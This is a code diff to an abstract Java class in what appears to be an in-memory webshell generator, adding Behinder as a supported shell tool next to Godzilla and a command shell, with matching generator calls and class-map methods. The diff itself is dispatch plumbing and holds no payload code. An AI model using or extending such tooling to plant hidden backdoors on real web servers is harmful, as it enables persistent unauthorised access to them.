@@ -1,6 +1,6 @@
 package com.reajason.javaweb.memshell;
 
-import com.reajason.javaweb.config.*;
+import com.reajason.javaweb.memshell.config.*;
 import org.apache.commons.lang3.tuple.Pair;
 
 import java.util.Collections;
@@ -31,6 +31,7 @@ public abstract class AbstractShell {
         return switch (tool) {
             case Godzilla -> getGodzillaShellMap().keySet().stream().sorted().toList();
             case Command -> getCommandShellMap().keySet().stream().sorted().toList();
+            case Behinder -> getBehinderShellMap().keySet().stream().sorted().toList();
             default -> Collections.emptyList();
         };
     }
@@ -82,21 +83,15 @@ public abstract class AbstractShell {
                 .build();
     }
 
-    /**
-     * 获取 Godzilla 注入生成类 Map
-     *
-     * @return shellType -> shellClass,injectorClass
-     */
     protected Map<String, Pair<Class<?>, Class<?>>> getGodzillaShellMap() {
         return Collections.emptyMap();
     }
 
-    /**
-     * 获取 Command 注入生成类 Map
-     *
-     * @return shellType -> shellClass,injectorClass
-     */
     protected Map<String, Pair<Class<?>, Class<?>>> getCommandShellMap() {
+        return Collections.emptyMap();
+    }
+
+    protected Map<String, Pair<Class<?>, Class<?>>> getBehinderShellMap() {
         return Collections.emptyMap();
     }
 
@@ -104,6 +99,7 @@ public abstract class AbstractShell {
         Map<String, Pair<Class<?>, Class<?>>> shellMap = switch (shellTool) {
             case Godzilla -> getGodzillaShellMap();
             case Command -> getCommandShellMap();
+            case Behinder -> getBehinderShellMap();
             default -> Collections.emptyMap();
         };
         return shellMap.get(shellType);
@@ -113,6 +109,7 @@ public abstract class AbstractShell {
         return switch (shellConfig.getShellTool()) {
             case Godzilla -> new GodzillaGenerator(shellConfig, (GodzillaConfig) shellToolConfig).getBytes();
             case Command -> CommandGenerator.generate(shellConfig, (CommandConfig) shellToolConfig);
+            case Behinder -> new BehinderGenerator(shellConfig, (BehinderConfig) shellToolConfig).getBytes();
             default -> throw new UnsupportedOperationException("Unknown shell tool: " + shellConfig.getShellTool());
         };
     }
